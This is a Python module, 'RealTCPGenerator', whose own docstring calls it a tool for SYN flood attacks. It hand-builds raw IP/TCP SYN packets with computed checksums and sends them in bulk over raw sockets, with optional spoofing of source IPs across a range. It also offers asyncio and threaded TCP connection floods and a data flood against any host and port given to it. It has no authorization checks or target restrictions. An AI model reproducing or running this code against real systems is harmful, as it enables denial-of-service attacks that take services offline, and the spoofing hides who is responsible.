"""
Real TCP packet generator.

This module generates real TCP connections and SYN packets using actual sockets.
Uses raw sockets where available (requires root) for SYN flood attacks.
"""

import socket
import struct
import time
import logging
import random
import asyncio
import platform
import os
from typing import Optional, List, Tuple, Dict, Any
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor

logger = logging.getLogger(__name__)


@dataclass
class TCPConnectionStats:
    """Statistics for TCP connections"""
    connections_attempted: int = 0
    connections_successful: int = 0
    connections_failed: int = 0
    bytes_sent: int = 0
    start_time: Optional[float] = None
    end_time: Optional[float] = None
    
    @property
    def duration(self) -> float:
        if self.start_time and self.end_time:
            return self.end_time - self.start_time
        return 0.0
    
    @property
    def connections_per_second(self) -> float:
        if self.duration > 0:
            return self.connections_successful / self.duration
        return 0.0
    
    @property
    def success_rate(self) -> float:
        if self.connections_attempted > 0:
            return self.connections_successful / self.connections_attempted
        return 0.0


class RealTCPGenerator:
    """
    Real TCP connection generator using actual sockets.
    
    Supports both regular TCP connections and raw socket SYN floods
    (raw sockets require root privileges on Linux/macOS).
    """
    
    def __init__(self, target_host: str, target_port: int):
        """
        Initialize TCP generator.
        
        Args:
            target_host: Target IP address or hostname
            target_port: Target TCP port
        """
        self.target_host = target_host
        self.target_port = target_port
        self.stats = TCPConnectionStats()
        self.platform = platform.system()
        self.can_use_raw_sockets = self._check_raw_socket_capability()
        
    def _check_raw_socket_capability(self) -> bool:
        """Check if raw sockets are available (requires root)"""
        if self.platform == 'Windows':
            # Windows raw sockets have restrictions
            return False
            
        try:
            # Try to create a raw socket
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            test_sock.close()
            return True
        except PermissionError:
            logger.info("Raw sockets require root privileges")
            return False
        except Exception as e:
            logger.debug(f"Raw socket test failed: {e}")
            return False
            
    def _calculate_tcp_checksum(self, source_ip: str, dest_ip: str, tcp_header: bytes, data: bytes = b'') -> int:
        """Calculate TCP checksum"""
        # Pseudo header for checksum calculation
        pseudo_header = struct.pack('!4s4sBBH',
                                   socket.inet_aton(source_ip),
                                   socket.inet_aton(dest_ip),
                                   0,  # Reserved
                                   socket.IPPROTO_TCP,
                                   len(tcp_header) + len(data))
        
        # Combine pseudo header, TCP header, and data
        checksum_data = pseudo_header + tcp_header + data
        
        # Calculate checksum
        if len(checksum_data) % 2:
            checksum_data += b'\x00'
            
        checksum = 0
        for i in range(0, len(checksum_data), 2):
            word = (checksum_data[i] << 8) + checksum_data[i + 1]
            checksum += word
            
        # Add carry bits
        while checksum >> 16:
            checksum = (checksum & 0xFFFF) + (checksum >> 16)
            
        return ~checksum & 0xFFFF
        
    def _create_tcp_syn_packet(self, source_ip: str, source_port: int) -> bytes:
        """Create raw TCP SYN packet"""
        # IP header
        version = 4
        ihl = 5
        tos = 0
        total_length = 40  # IP header (20) + TCP header (20)
        identification = random.randint(1, 65535)
        flags = 0x4000  # Don't fragment
        ttl = 64
        protocol = socket.IPPROTO_TCP
        checksum = 0  # Will be calculated by kernel
        source = socket.inet_aton(source_ip)
        dest = socket.inet_aton(self.target_host)
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               (version << 4) + ihl,
                               tos,
                               total_length,
                               identification,
                               flags,
                               ttl,
                               protocol,
                               checksum,
                               source,
                               dest)
        
        # TCP header
        seq_num = random.randint(1, 4294967295)
        ack_num = 0
        data_offset = 5  # 20 bytes
        flags = 0x02  # SYN flag
        window_size = 65535
        tcp_checksum = 0  # Will calculate later
        urgent_ptr = 0
        
        tcp_header = struct.pack('!HHLLBBHHH',
                                source_port,
                                self.target_port,
                                seq_num,
                                ack_num,
                                (data_offset << 4),
                                flags,
                                window_size,
                                tcp_checksum,
                                urgent_ptr)
        
        # Calculate TCP checksum
        tcp_checksum = self._calculate_tcp_checksum(source_ip, self.target_host, tcp_header)
        
        # Rebuild TCP header with correct checksum
        tcp_header = struct.pack('!HHLLBBHHH',
                                source_port,
                                self.target_port,
                                seq_num,
                                ack_num,
                                (data_offset << 4),
                                flags,
                                window_size,
                                tcp_checksum,
                                urgent_ptr)
        
        return ip_header + tcp_header
        
    def send_syn_flood_raw(self, packet_count: int, source_ip_range: Optional[Tuple[str, str]] = None) -> TCPConnectionStats:
        """
        Send SYN flood using raw sockets (requires root).
        
        Args:
            packet_count: Number of SYN packets to send
            source_ip_range: Tuple of (start_ip, end_ip) for IP spoofing
            
        Returns:
            Connection statistics
        """
        if not self.can_use_raw_sockets:
            raise PermissionError("Raw sockets require root privileges")
            
        stats = TCPConnectionStats()
        stats.start_time = time.perf_counter()
        
        try:
            # Create raw socket
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            logger.info(f"Starting raw SYN flood: {packet_count} packets to {self.target_host}:{self.target_port}")
            
            for i in range(packet_count):
                # Generate source IP and port
                if source_ip_range:
                    # Simple IP range spoofing
                    start_parts = list(map(int, source_ip_range[0].split('.')))
                    end_parts = list(map(int, source_ip_range[1].split('.')))
                    # Randomize last octet
                    source_ip = f"{start_parts[0]}.{start_parts[1]}.{start_parts[2]}.{random.randint(start_parts[3], end_parts[3])}"
                else:
                    # Use local IP
                    source_ip = socket.gethostbyname(socket.gethostname())
                    
                source_port = random.randint(1024, 65535)
                
                # Create and send SYN packet
                packet = self._create_tcp_syn_packet(source_ip, source_port)
                
                try:
                    raw_sock.sendto(packet, (self.target_host, 0))
                    stats.connections_attempted += 1
                    stats.connections_successful += 1
                    stats.bytes_sent += len(packet)
                except Exception as e:
                    logger.debug(f"Failed to send SYN packet: {e}")
                    stats.connections_attempted += 1
                    stats.connections_failed += 1
                    
            raw_sock.close()
            
        except Exception as e:
            logger.error(f"Raw SYN flood failed: {e}")
            raise
            
        stats.end_time = time.perf_counter()
        
        logger.info(f"Raw SYN flood complete: {stats.connections_successful}/{packet_count} sent, "
                   f"{stats.connections_per_second:.1f} connections/sec")
        
        return stats
        
    async def _create_connection(self, timeout: float = 5.0) -> bool:
        """Create a single TCP connection asynchronously"""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.target_host, self.target_port),
                timeout=timeout
            )
            
            # Connection successful
            writer.close()
            await writer.wait_closed()
            return True
            
        except asyncio.TimeoutError:
            logger.debug(f"Connection timeout to {self.target_host}:{self.target_port}")
            return False
        except Exception as e:
            logger.debug(f"Connection failed to {self.target_host}:{self.target_port}: {e}")
            return False
            
    async def send_connection_flood_async(self, connection_count: int, 
                                        concurrent_limit: int = 100,
                                        timeout: float = 5.0) -> TCPConnectionStats:
        """
        Send TCP connection flood using asyncio.
        
        Args:
            connection_count: Number of connections to attempt
            concurrent_limit: Maximum concurrent connections
            timeout: Connection timeout in seconds
            
        Returns:
            Connection statistics
        """
        stats = TCPConnectionStats()
        stats.start_time = time.perf_counter()
        
        logger.info(f"Starting async TCP connection flood: {connection_count} connections, "
                   f"{concurrent_limit} concurrent")
        
        # Create semaphore to limit concurrent connections
        semaphore = asyncio.Semaphore(concurrent_limit)
        
        async def connect_with_semaphore():
            async with semaphore:
                return await self._create_connection(timeout)
                
        # Create all connection tasks
        tasks = [connect_with_semaphore() for _ in range(connection_count)]
        
        # Execute tasks and collect results
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Process results
        for result in results:
            stats.connections_attempted += 1
            if isinstance(result, bool) and result:
                stats.connections_successful += 1
            else:
                stats.connections_failed += 1
                
        stats.end_time = time.perf_counter()
        
        logger.info(f"Async TCP flood complete: {stats.connections_successful}/{connection_count} successful, "
                   f"{stats.connections_per_second:.1f} connections/sec, "
                   f"{stats.success_rate:.1%} success rate")
        
        return stats
        
    def send_connection_flood_threaded(self, connection_count: int,
                                     thread_count: int = 10,
                                     timeout: float = 5.0) -> TCPConnectionStats:
        """
        Send TCP connection flood using threads.
        
        Args:
            connection_count: Number of connections to attempt
            thread_count: Number of worker threads
            timeout: Connection timeout in seconds
            
        Returns:
            Connection statistics
        """
        stats = TCPConnectionStats()
        stats.start_time = time.perf_counter()
        
        logger.info(f"Starting threaded TCP connection flood: {connection_count} connections, "
                   f"{thread_count} threads")
        
        def create_connection_sync() -> bool:
            """Synchronous connection creation for thread pool"""
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                sock.connect((self.target_host, self.target_port))
                sock.close()
                return True
            except Exception:
                return False
                
        # Use thread pool to create connections
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures = [executor.submit(create_connection_sync) for _ in range(connection_count)]
            
            for future in futures:
                stats.connections_attempted += 1
                try:
                    if future.result():
                        stats.connections_successful += 1
                    else:
                        stats.connections_failed += 1
                except Exception:
                    stats.connections_failed += 1
                    
        stats.end_time = time.perf_counter()
        
        logger.info(f"Threaded TCP flood complete: {stats.connections_successful}/{connection_count} successful, "
                   f"{stats.connections_per_second:.1f} connections/sec, "
                   f"{stats.success_rate:.1%} success rate")
        
        return stats
        
    def send_data_flood(self, data: bytes, connection_count: int = 1, 
                       send_count_per_connection: int = 100) -> TCPConnectionStats:
        """
        Send data flood over TCP connections.
        
        Args:
            data: Data to send
            connection_count: Number of connections to use
            send_count_per_connection: Number of sends per connection
            
        Returns:
            Connection statistics
        """
        stats = TCPConnectionStats()
        stats.start_time = time.perf_counter()
        
        logger.info(f"Starting TCP data flood: {connection_count} connections, "
                   f"{send_count_per_connection} sends each, {len(data)} bytes per send")
        
        for conn_num in range(connection_count):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10.0)
                sock.connect((self.target_host, self.target_port))
                
                stats.connections_attempted += 1
                stats.connections_successful += 1
                
                # Send data multiple times
                for send_num in range(send_count_per_connection):
                    try:
                        bytes_sent = sock.send(data)
                        stats.bytes_sent += bytes_sent
                    except Exception as e:
                        logger.debug(f"Send failed on connection {conn_num}: {e}")
                        break
                        
                sock.close()
                
            except Exception as e:
                logger.debug(f"Connection {conn_num} failed: {e}")
                stats.connections_attempted += 1
                stats.connections_failed += 1
                
        stats.end_time = time.perf_counter()
        
        logger.info(f"TCP data flood complete: {stats.connections_successful} connections, "
                   f"{stats.bytes_sent} bytes sent")
        
        return stats
        
    def get_capabilities(self) -> Dict[str, Any]:
        """Get TCP generator capabilities"""
        return {
            'platform': self.platform,
            'raw_sockets_available': self.can_use_raw_sockets,
            'async_connections': True,
            'threaded_connections': True,
            'syn_flood_capability': self.can_use_raw_sockets,
            'note': 'Raw SYN flood requires root privileges on Linux/macOS'
        }


def create_tcp_generator(target_host: str, target_port: int) -> RealTCPGenerator:
    """
    Factory function to create TCP generator.
    
    Args:
        target_host: Target IP address or hostname
        target_port: Target TCP port
        
    Returns:
        Configured TCP generator
    """
    return RealTCPGenerator(target_host, target_port)